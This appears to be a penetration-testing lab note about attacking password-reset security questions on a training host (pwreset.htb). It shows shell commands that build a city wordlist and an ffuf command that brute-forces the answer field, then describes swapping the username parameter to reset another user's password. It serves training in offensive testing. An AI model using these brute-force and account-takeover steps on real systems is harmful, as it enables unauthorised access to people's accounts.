## Guessable Password Reset Questions
Use OSINT
- What is your mother's maiden name?
- What city were you born in?

**Brute-force cities
https://github.com/datasets/world-cities/blob/master/data/world-cities.csv
```
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt
```

```
ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
```


There may be an instance where the username parameter is supplied. We can answer the security question and then reset the password for a different user by supplying another user in the parameter.
